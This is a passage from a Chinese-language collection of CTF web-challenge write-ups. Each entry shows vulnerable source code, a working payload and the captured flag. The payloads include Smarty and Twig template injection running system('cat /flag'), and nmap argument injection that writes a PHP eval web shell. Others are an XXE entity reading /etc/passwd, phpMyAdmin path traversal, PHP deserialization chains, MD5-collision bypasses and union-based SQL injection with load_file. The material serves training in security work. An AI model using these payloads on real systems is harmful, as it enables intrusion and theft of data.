language=\u0026#34;php\u0026#34;\u0026gt;phpinfo();\u0026lt;/script\u0026gt; 但是没回显，查了资料发现这种方法在PHP 7+中已经被移除了，本题PHP版本为7.3.13，没思路了\n看了wp说是smarty模板注入：\n{$smarty.version} #获取smarty的版本号\rYour IP is : 3.1.34-dev-7\r{php}phpinfo();{/php} #执行相应的php代码，但是Smarty3版本中已经废弃{php}标签，本题无法使用\r{literal}alert(\u0026#39;xss\u0026#39;);{/literal} #也是XSS，用来避免js被误解析\r{if phpinfo()}{/if} #Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||，or，\u0026amp;\u0026amp;，and，is_array()等等 {if system(\u0026#39;cat /flag\u0026#39;)}{/if}\rYour IP is : flag{f9a2b969-f4d4-4168-a4f5-137fb7f46b37} [BJDCTF2020]ZJCTF，不过如此 ?text=data:,I have a dream\u0026amp;file=php://filter/read=convert.base64-encode/resource=next.php next.php：\n\u0026lt;?php $id = $_GET[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;id\u0026#39;] = $id; function complex($re, $str) { return preg_replace( \u0026#39;/(\u0026#39; . $re . \u0026#39;)/ei\u0026#39;, \u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;, $str ); } foreach($_GET as $re =\u0026gt; $str) { echo complex($re, $str). \u0026#34;\\n\u0026#34;; } function getFlag(){ @eval($_GET[\u0026#39;cmd\u0026#39;]); } preg_replace /e模式导致第二个参数可以被当作php语句执行，foreach的参数是$_GET，因此没必要传id\n?.*=${phpinfo()}; 拼接后：\npreg_replace(\u0026#39;(.*)/ei\u0026#39;,\u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;,\u0026#39;phpinfo();\u0026#39;); 但在php中当非法字符为首字母时，只有点号会被替换成下划线，所以换一个参数名即可，\\S表示匹配所有非空白符：\n?\\S*=${phpinfo()}; 在php中上面的payload等价于执行如下语句，花括号内为表达式，先执行表达式，再尝试访问$变量：\n\u0026#34;${phpinfo()}\u0026#34;; // ${expr} (variable variables) 由于引号会被转义，所以只能调用getFlag()，最终payload：\n?\\S*=${getFlag()};\u0026amp;cmd=system(\u0026#39;cat /flag\u0026#39;); flag{3ce52793-2870-4076-a120-b6931631542f}\n[BUUCTF 2018]Online Tool escapeshellarg和escapeshellcmd的联合使用 + 未将用户输入置于参数位\nescapeshellarg会在单引号之前加上 \\, 并在被转义的单引号两边和整个字符串两边加上单引号\nescapeshellcmd会在所有的 \\ 前加上 \\，并在单独的单引号（未成对的）前加 \\\n尝试将命令的输出结果保存到文件中，这样可以实现写入一句话木马\n一开始尝试了-oN，保存的文件内容中\u0026quot;\\\u0026lt;?php\u0026quot;.会导致php解析报错，无法拿shell：\n# Nmap 7.70 scan initiated Sat Jul 19 00:48:27 2025 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oN aaa.php \\\u0026lt;?php @eval($_POST[1]) ?\u0026gt; \\\\\rFailed to resolve \u0026#34;\\\u0026lt;?php\u0026#34;.\rFailed to resolve \u0026#34;eval($_POST[1])\u0026#34;.\rFailed to resolve \u0026#34;?\u0026gt;\u0026#34;.\rFailed to resolve \u0026#34;\\\\\u0026#34;.\rWARNING: No targets were specified, so 0 hosts scanned.\r# Nmap done at Sat Jul 19 00:48:27 2025 -- 0 IP addresses (0 hosts up) scanned in 0.05 seconds 后来尝试-oG (Grepable 格式)，shell.php可以被解析\n?host=\u0026#39;\u0026lt;?php @eval($_POST[1]) ?\u0026gt; -oG shell.php \u0026#39; escapeshellarg后：\n\u0026#39;\u0026#39;\\\u0026#39;\u0026#39;\u0026lt;?php @eval($_POST[1]) ?\u0026gt; -oG shell.php \u0026#39;\\\u0026#39;\u0026#39;\u0026#39; escapeshellcmd后（没有单独的单引号）：\n\u0026#39;\u0026#39;\\\\\u0026#39;\u0026#39;\u0026lt;?php @eval($_POST[1]) ?\u0026gt; -oG shell.php \u0026#39;\\\\\u0026#39;\u0026#39;\u0026#39; 完整的执行命令：\nnmap -T5 -sT -Pn --host-timeout 2 -F \\\\\u0026lt;?php @eval($_POST[1]) ?\u0026gt; -oG shell.php \\\\ shell.php：\n# Nmap 7.70 scan initiated Sat Jul 19 00:53:51 2025 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG shell.php \\\u0026lt;?php @eval($_POST[1]) ?\u0026gt; \\\\\r# Nmap done at Sat Jul 19 00:53:51 2025 -- 0 IP addresses (0 hosts up) scanned in 0.06 seconds flag{a8339bf9-7e19-4606-9937-7b59a8e81acf}\n[GXYCTF2019]禁止套娃 访问.git响应码403，.git源码泄露：\npython GitHack.py http://287013c6-0b05-48bd-8df7-1b30898ed1a1.node5.buuoj.cn:81/.git/ index.php：\n\u0026lt;?php include \u0026#34;flag.php\u0026#34;; echo \u0026#34;flag在哪里呢？\u0026lt;br\u0026gt;\u0026#34;; if(isset($_GET[\u0026#39;exp\u0026#39;])){ if (!preg_match(\u0026#39;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i\u0026#39;, $_GET[\u0026#39;exp\u0026#39;])) { if(\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[a-z,_]+\\((?R)?\\)/\u0026#39;, NULL, $_GET[\u0026#39;exp\u0026#39;])) { if (!preg_match(\u0026#39;/et|na|info|dec|bin|hex|oct|pi|log/i\u0026#39;, $_GET[\u0026#39;exp\u0026#39;])) { // echo $_GET[\u0026#39;exp\u0026#39;]; @eval($_GET[\u0026#39;exp\u0026#39;]); } else{ die(\u0026#34;还差一点哦！\u0026#34;); } } else{ die(\u0026#34;再好好想想！\u0026#34;); } } else{ die(\u0026#34;还想读flag，臭弟弟！\u0026#34;); } } // highlight_file(__FILE__); ?\u0026gt; 只允许执行形如func()的函数，考虑无参rce，随机爆出flag.php：\n?exp=var_dump(scandir(current(localeconv())));\rarray(5) { [0]=\u0026gt; string(1) \u0026#34;.\u0026#34; [1]=\u0026gt; string(2) \u0026#34;..\u0026#34; [2]=\u0026gt; string(4) \u0026#34;.git\u0026#34; [3]=\u0026gt; string(8) \u0026#34;flag.php\u0026#34; [4]=\u0026gt; string(9) \u0026#34;index.php\u0026#34; } ?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));\r\u0026lt;?php\r$flag = \u0026#34;flag{49c2ad3e-a178-43b4-8abe-019245914871}\u0026#34;;\r?\u0026gt; 看了其他师傅的wp，有稳定读出flag.php的方法：\n?exp=highlight_file(next(array_reverse(scandir(current(localeconv()))))); [NCTF2019]Fake XML cookbook xxe，username回显：\n\u0026lt;!DOCTYPE user [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;xxe;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; payload:\n\u0026lt;!DOCTYPE user [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;xxe;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; flag{9ee04b17-fc13-4ff2-a6c1-44fc20929f0b}\n[GWCTF 2019]我有一个数据库 直接访问得到乱码，其实是编码方式不统一导致的：\n鎴戞湁涓€涓暟鎹簱锛屼絾閲岄潰浠€涔堜篃娌℃湁~\r涓嶄俊浣犳壘\rGBK-\u0026gt;UTF-8\r我有一个数据库，但里面什么也没有~\r不信你找 robots.txt：\nUser-agent: *\rDisallow: phpinfo.php 扫描发现有phpmyadmin，根据版本找找CVE：phpMyAdmin 4.8.1后台文件包含漏洞（CVE-2018-12613）\n目录穿越：\n?target=db_sql.php%253f/../../../../../../../../flag flag{f1cd2c40-be69-4549-ba63-d563837319d0}\n[BJDCTF2020]Mark loves cat .git源码泄露：\nindex.php：\n\u0026lt;?php include \u0026#39;flag.php\u0026#39;; $yds = \u0026#34;dog\u0026#34;; $is = \u0026#34;cat\u0026#34;; $handsome = \u0026#39;yds\u0026#39;; foreach($_POST as $x =\u0026gt; $y){ $$x = $y; } foreach($_GET as $x =\u0026gt; $y){ $$x = $$y; } foreach($_GET as $x =\u0026gt; $y){ if($_GET[\u0026#39;flag\u0026#39;] === $x \u0026amp;\u0026amp; $x !== \u0026#39;flag\u0026#39;){ exit($handsome); } } if(!isset($_GET[\u0026#39;flag\u0026#39;]) \u0026amp;\u0026amp; !isset($_POST[\u0026#39;flag\u0026#39;])){ exit($yds); } if($_POST[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39; || $_GET[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39;){ exit($is); } echo \u0026#34;the flag is: \u0026#34;.$flag; flag.php：\n\u0026lt;?php $flag = file_get_contents(\u0026#39;/flag\u0026#39;); 尝试传入?yds=flag，第二个foreach会执行$yds = $flag;，由于未传入flag参数，所以会执行exit($yds);输出flag：\nflag{2c9108b6-b53e-4aae-a2ae-fba4fc401577}\n[WUSTCTF2020]朴实无华 访问/fAke_f1agggg.php，header里有hint：\nlook_at_me：/fl4g.php fl4g.php：\n\u0026lt;img src=\u0026#34;/img.jpg\u0026#34;\u0026gt; \u0026lt;?php header(\u0026#39;Content-type:text/html;charset=utf-8\u0026#39;); error_reporting(0); highlight_file(__file__); //level 1 if (isset($_GET[\u0026#39;num\u0026#39;])){ $num = $_GET[\u0026#39;num\u0026#39;]; if(intval($num) \u0026lt; 2020 \u0026amp;\u0026amp; intval($num + 1) \u0026gt; 2021){ echo \u0026#34;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.\u0026lt;/br\u0026gt;\u0026#34;; }else{ die(\u0026#34;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�\u0026#34;); } }else{ die(\u0026#34;鍘婚潪娲插惂\u0026#34;); } //level 2 if (isset($_GET[\u0026#39;md5\u0026#39;])){ $md5=$_GET[\u0026#39;md5\u0026#39;]; if ($md5==md5($md5)) echo \u0026#34;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.\u0026lt;/br\u0026gt;\u0026#34;; else die(\u0026#34;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�\u0026#34;); }else{ die(\u0026#34;鍘婚潪娲插惂\u0026#34;); } //get flag if (isset($_GET[\u0026#39;get_flag\u0026#39;])){ $get_flag = $_GET[\u0026#39;get_flag\u0026#39;]; if(!strstr($get_flag,\u0026#34; \u0026#34;)){ $get_flag = str_ireplace(\u0026#34;cat\u0026#34;, \u0026#34;wctf2020\u0026#34;, $get_flag); echo \u0026#34;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.\u0026lt;/br\u0026gt;\u0026#34;; system($get_flag); }else{ die(\u0026#34;蹇埌闈炴床浜�\u0026#34;); } }else{ die(\u0026#34;鍘婚潪娲插惂\u0026#34;); } ?\u0026gt; 科学计数法+0e+${IFS}绕过：\n?num=2019e1\u0026amp;md5=0e215962017\u0026amp;get_flag=tac${IFS}fll* flag{49c90321-da30-42cb-90b6-f262f3e55eae}\n[BJDCTF2020]Cookie is so stable 注入点为Cookie中的user，尝试设置user={{2*2}}，flag.php页面回显4，确定是twig模板，相关文章：\nuser={{_self.env.registerUndefinedFilterCallback(\u0026#34;exec\u0026#34;)}}{{_self.env.getFilter(\u0026#34;cat /flag\u0026#34;)}} flag{413ac946-069a-4427-88fc-de20189c7b40}\n[MRCTF2020]Ezpop \u0026lt;?php class Modifier { protected $var = \u0026#34;php://filter/read=convert.base64-encode/resource=flag.php\u0026#34;; } class Show{ public $source; public $str; } class Test{ public $p; } $a = new Modifier(); $b = new Test(); $b-\u0026gt;p = $a; $c = new Show(); $c-\u0026gt;str = $b; $d = new Show(); $d-\u0026gt;source = $c; print(urlencode(serialize($d))); ?\u0026gt; payload：\n?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D flag.php：\n\u0026lt;?php class Flag{ private $flag= \u0026#34;flag{eee8f673-47ef-4f44-958d-17f89c32534b}\u0026#34;; } echo \u0026#34;Help Me Find FLAG!\u0026#34;; ?\u0026gt; [MRCTF2020]PYWebsite 验证码校验是写在前端的：\n\u0026lt;script\u0026gt; function enc(code){ hash = hex_md5(code); return hash; } function validate(){ var code = document.getElementById(\u0026#34;vcode\u0026#34;).value; if (code != \u0026#34;\u0026#34;){ if(hex_md5(code) == \u0026#34;0cd4da0223c0b280829dc3ea458d655c\u0026#34;){ alert(\u0026#34;您通过了验证！\u0026#34;); window.location = \u0026#34;./flag.php\u0026#34; }else{ alert(\u0026#34;你的授权码不正确！\u0026#34;); } }else{ alert(\u0026#34;请输入授权码\u0026#34;); } } \u0026lt;/script\u0026gt; 找个爆md5的网站，拿到验证码：ARandomString，不获取验证码直接访问flag.php也行\n说是只有购买者和自己才能看到flag，xff伪造一下本地ip即可拿到flag\nflag{68e4fd44-53c1-4aff-b8de-a6d00a360d67}\n[安洵杯 2019]easy_web img中的参数经过两次base64解码+hex得到555.png，考虑获取index.php：\n?img=TXpVek5UTTFNbVUzTURabE5qYz0 index.php：\n\u0026lt;?php error_reporting(E_ALL || ~ E_NOTICE); header(\u0026#39;content-type:text/html;charset=utf-8\u0026#39;); $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!isset($_GET[\u0026#39;img\u0026#39;]) || !isset($_GET[\u0026#39;cmd\u0026#39;])) header(\u0026#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0\u0026amp;cmd=\u0026#39;); $file = hex2bin(base64_decode(base64_decode($_GET[\u0026#39;img\u0026#39;]))); $file = preg_replace(\u0026#34;/[^a-zA-Z0-9.]+/\u0026#34;, \u0026#34;\u0026#34;, $file); if (preg_match(\u0026#34;/flag/i\u0026#34;, $file)) { echo \u0026#39;\u0026lt;img src =\u0026#34;./ctf3.jpeg\u0026#34;\u0026gt;\u0026#39;; die(\u0026#34;xixi～ no flag\u0026#34;); } else { $txt = base64_encode(file_get_contents($file)); echo \u0026#34;\u0026lt;img src=\u0026#39;data:image/gif;base64,\u0026#34; . $txt . \u0026#34;\u0026#39;\u0026gt;\u0026lt;/img\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } echo $cmd; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if (preg_match(\u0026#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\\u0026#39;|\\\u0026#34;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\\u0026amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|\u0026lt;|\u0026gt;/i\u0026#34;, $cmd)) { echo(\u0026#34;forbid ~\u0026#34;); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { if ((string)$_POST[\u0026#39;a\u0026#39;] !== (string)$_POST[\u0026#39;b\u0026#39;] \u0026amp;\u0026amp; md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) { echo `$cmd`; } else { echo (\u0026#34;md5 is funny ~\u0026#34;); } } ?\u0026gt; \u0026lt;html\u0026gt; \u0026lt;style\u0026gt; body{ background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC; } \u0026lt;/style\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; md5绕过：\na=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2\u0026amp;b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 可以用strings或者sort读取/flag绕过过滤，\nflag{1ca8c741-1ec0-4192-8af1-2d4cd7a962cf}\n[WesternCTF2018]shrine import flask import os app = flask.Flask(__name__) app.config[\u0026#39;FLAG\u0026#39;] = os.environ.pop(\u0026#39;FLAG\u0026#39;) @app.route(\u0026#39;/\u0026#39;) def index(): return open(__file__).read() @app.route(\u0026#39;/shrine/\u0026lt;path:shrine\u0026gt;\u0026#39;) def shrine(shrine): def safe_jinja(s): s = s.replace(\u0026#39;(\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;)\u0026#39;, \u0026#39;\u0026#39;) blacklist = [\u0026#39;config\u0026#39;, \u0026#39;self\u0026#39;] return \u0026#39;\u0026#39;.join([\u0026#39;\\{\\{% set {}=None%}}\u0026#39;.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 只对单独的config和self置None，用__globals__来访问current_app，再获取config：\nurl_for.__globals__[\u0026#39;current_app\u0026#39;].config\rget_flashed_messages.__globals__[\u0026#39;current_app\u0026#39;].config flag{0c4e9d3e-3ac6-425a-aa06-25b0a5830f08}\n[安洵杯 2019]easy_serialize_php index.php：\n\u0026lt;?php $function = @$_GET[\u0026#39;f\u0026#39;]; function filter($img){ $filter_arr = array(\u0026#39;php\u0026#39;,\u0026#39;flag\u0026#39;,\u0026#39;php5\u0026#39;,\u0026#39;php4\u0026#39;,\u0026#39;fl1g\u0026#39;); $filter = \u0026#39;/\u0026#39;.implode(\u0026#39;|\u0026#39;,$filter_arr).\u0026#39;/i\u0026#39;; return preg_replace($filter,\u0026#39;\u0026#39;,$img); } if($_SESSION){ unset($_SESSION); } $_SESSION[\u0026#34;user\u0026#34;] = \u0026#39;guest\u0026#39;; $_SESSION[\u0026#39;function\u0026#39;] = $function; extract($_POST); if(!$function){ echo \u0026#39;\u0026lt;a href=\u0026#34;index.php?f=highlight_file\u0026#34;\u0026gt;source_code\u0026lt;/a\u0026gt;\u0026#39;; } if(!$_GET[\u0026#39;img_path\u0026#39;]){ $_SESSION[\u0026#39;img\u0026#39;] = base64_encode(\u0026#39;guest_img.png\u0026#39;); }else{ $_SESSION[\u0026#39;img\u0026#39;] = sha1(base64_encode($_GET[\u0026#39;img_path\u0026#39;])); } $serialize_info = filter(serialize($_SESSION)); if($function == \u0026#39;highlight_file\u0026#39;){ highlight_file(\u0026#39;index.php\u0026#39;); }else if($function == \u0026#39;phpinfo\u0026#39;){ eval(\u0026#39;phpinfo();\u0026#39;); //maybe you can find something in here! }else if($function == \u0026#39;show_image\u0026#39;){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[\u0026#39;img\u0026#39;])); } phpinfo中搜搜能找到d0g3_f1ag.php，base64编码：ZDBnM19mMWFnLnBocA==\n由于sha1无法直接控制$_SESSION[\u0026lsquo;img\u0026rsquo;]，只能通过extract覆盖+字符逃逸的方式来控制img：\n_SESSION[user]=flagflagflagflagflagflag\u0026amp;_SESSION[function]=A\u0026#34;;s:8:\u0026#34;function\u0026#34;;s:4:\u0026#34;test\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;} d0g3_f1ag.php：\n\u0026lt;?php\r$flag = \u0026#39;flag in /d0g3_fllllllag\u0026#39;;\r?\u0026gt; 最终payload：\n_SESSION[user]=flagflagflagflagflagflag\u0026amp;_SESSION[function]=A\u0026#34;;s:8:\u0026#34;function\u0026#34;;s:4:\u0026#34;test\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;L2QwZzNfZmxsbGxsbGFn\u0026#34;;} flag{b654c7a0-5923-47fc-b843-341cbb593eee}\n[网鼎杯 2020 朱雀组]Nmap fuzz一下，输入'127.0.0.1;'，结果保存在/result.php?f=d9561：\nHost maybe down 随便改一下参数f报错：\nWarning: simplexml_load_file(): I/O warning : failed to load external entity \u0026#34;xml/d951\u0026#34; in /var/www/html/result.php on line 23\rWrong file name 再访问一下xml文档/xml/d9561，看看nmap结果具体写了什么进去：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE nmaprun\u0026gt; \u0026lt;?xml-stylesheet href=\u0026#34;file:///usr/bin/../share/nmap/nmap.xsl\u0026#34; type=\u0026#34;text/xsl\u0026#34;?\u0026gt; \u0026lt;!-- Nmap 6.47 scan initiated Mon Jul 21 04:22:13 2025 as: nmap -Pn -T4 -F -\u0026amp;#45;host-timeout 1000ms -oX xml/d9561 \\\\127.0.0.1;\\\\\\\\ --\u0026gt; \u0026lt;nmaprun scanner=\u0026#34;nmap\u0026#34; args=\u0026#34;nmap -Pn -T4 -F -\u0026amp;#45;host-timeout 1000ms -oX xml/d9561 \\\\127.0.0.1;\\\\\\\\\u0026#34; start=\u0026#34;1753071733\u0026#34; startstr=\u0026#34;Mon Jul 21 04:22:13 2025\u0026#34; version=\u0026#34;6.47\u0026#34; xmloutputversion=\u0026#34;1.04\u0026#34;\u0026gt; \u0026lt;scaninfo type=\u0026#34;connect\u0026#34; protocol=\u0026#34;tcp\u0026#34; numservices=\u0026#34;100\u0026#34; services=\u0026#34;7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157\u0026#34;/\u0026gt; \u0026lt;verbose level=\u0026#34;0\u0026#34;/\u0026gt; \u0026lt;debugging level=\u0026#34;0\u0026#34;/\u0026gt; \u0026lt;runstats\u0026gt;\u0026lt;finished time=\u0026#34;1753071733\u0026#34; timestr=\u0026#34;Mon Jul 21 04:22:13 2025\u0026#34; elapsed=\u0026#34;0.10\u0026#34; summary=\u0026#34;Nmap done at Mon Jul 21 04:22:13 2025; 0 IP addresses (0 hosts up) scanned in 0.10 seconds\u0026#34; exit=\u0026#34;success\u0026#34;/\u0026gt;\u0026lt;hosts up=\u0026#34;0\u0026#34; down=\u0026#34;0\u0026#34; total=\u0026#34;0\u0026#34;/\u0026gt; \u0026lt;/runstats\u0026gt; \u0026lt;/nmaprun\u0026gt; escapeshellarg+escapeshellcmd+参数可控，过滤了php，由于php版本为5.5.38，可以用短标签绕过或者短回显绕过：\n\u0026lt;? PHP代码 ?\u0026gt; 需要在 php.ini 中启用 short_open_tag=On\r\u0026lt;?= PHP代码 ?\u0026gt; payload：\n\u0026#39;\u0026lt;?@eval($_POST[1])?\u0026gt; -oG shell.phtml \u0026#39; flag{bf4f53bf-1122-4251-850f-a2aed2d00ac4}\n还有一种绕过方式 ASP风格标签 \u0026lt;% PHP代码 %\u0026gt;，要求php版本小于7，但是本题asp_tags不为On\n[NPUCTF2020]ReadlezPHP time.php?source：\n\u0026lt;?php #error_reporting(0); class HelloPhp { public $a; public $b; public function __construct(){ $this-\u0026gt;a = \u0026#34;Y-m-d h:i:s\u0026#34;; $this-\u0026gt;b = \u0026#34;date\u0026#34;; } public function __destruct(){ $a = $this-\u0026gt;a; $b = $this-\u0026gt;b; echo $b($a); } } $c = new HelloPhp; if(isset($_GET[\u0026#39;source\u0026#39;])) { highlight_file(__FILE__); die(0); } @$ppp = unserialize($_GET[\u0026#34;data\u0026#34;]); \u0026lt;?php class HelloPhp { public $a = \u0026#34;phpinfo()\u0026#34;; public $b = \u0026#34;assert\u0026#34;; } print(urlencode(serialize(new HelloPhp()))); ?\u0026gt; flag在环境变量里：flag{66e902ae-7bf2-429a-bbbe-761cc9a02c94}\n[ASIS 2019]Unicorn shop 什么参数都不填会返回报错/charge：\nTraceback (most recent call last): File \u0026#34;/usr/local/lib/python2.7/site-packages/tornado/web.py\u0026#34;, line 1541, in _execute result = method(*self.path_args, **self.path_kwargs) File \u0026#34;/app/sshop/views/Shop.py\u0026#34;, line 34, in post unicodedata.numeric(price) TypeError: need a single Unicode character as parameter 尝试输入不同参数发现，只能买4，并且价格只能是一个字符，利用unicodedata.numeric可以将有数字意义的unicode字符转为浮点数：\nid=4\u0026amp;price=万 flag{82b310d7-44b3-466f-8897-55aa2c15c5f5}\n[CISCN2019 华东南赛区]Web11 smarty模板注入，版本3.1.30：\nX-forwarded-for: {if system(\u0026#39;cat /flag\u0026#39;)}{/if} flag{533b1d69-7c4a-4921-9441-bc3159114614}\n[BSidesCF 2019]Kookie 越权：\nCookie: username=admin flag{669d21db-c083-4b61-a91b-e5a16bf3221a}\n[SWPU2019]Web1 存在admin用户，随便注册一个test用户登录，发布广告存在XSS，广告详情是一个sql查询，应该是根据广告名进行的查询，单引号闭合发现报错，广告申请将# --注释符以及and or过滤，考虑直接闭合引号，一共22列：\n-100\u0026#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/\u0026#39; 注入点在2和3的位置，先查数据库名和用户权限：\n-100\u0026#39;/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/\u0026#39;\rweb1 root@localhost 尝试load_file，读取register.php，login.php，addads.php和detail.php\nregister.php：\n\u0026lt;?php include_once(\u0026#34;./config.php\u0026#34;); error_reporting(0); if(isset($_POST[\u0026#39;ac\u0026#39;])){ if($_POST[\u0026#39;ac\u0026#39;] === \u0026#39;register\u0026#39;){ $username = htmlspecialchars(addslashes($_POST[\u0026#39;username\u0026#39;])); $password = md5($_POST[\u0026#39;password\u0026#39;]); // echo $username; // if(check($username)){ // die(\u0026#34;Oh No! You are a hacker!! Not here!!!\u0026lt;br\u0026gt;\u0026#34;); // } // echo $username; $sql_query = \u0026#34;select * from users where name = \u0026#39;$username\u0026#39; limit 0,1\u0026#34;; $sql_insert = \u0026#34;insert into users (name, pass) values (\u0026#39;$username\u0026#39;,\u0026#39;$password\u0026#39;)\u0026#34;; $result_query = $conn-\u0026gt;query($sql_query); if($result_query-\u0026gt;num_rows){ die(\u0026#34;\u0026lt;font color=\u0026#39;red\u0026#39; size=\u0026#39;4\u0026#39;\u0026gt;该用户已被注册\u0026lt;/font\u0026gt;\u0026#34;); }else{ $result_insert = $conn-\u0026gt;query($sql_insert); if($result_insert){ header(\u0026#34;Location: login.php\u0026#34;); exit(); }else{ die(\u0026#34;\u0026lt;font color=\u0026#39;red\u0026#39; size=\u0026#39;4\u0026#39;\u0026gt;注册失败\u0026lt;/font\u0026gt;\u0026#34;); } } } } $conn-\u0026gt;close(); ?\u0026gt; login.php\n\u0026lt;?php session_start(); include_once(\u0026#39;./config.php\u0026#39;); error_reporting(0); if(isset($_POST[\u0026#39;ac\u0026#39;])){ if($_POST[\u0026#39;ac\u0026#39;] === \u0026#39;login\u0026#39;){ $user = 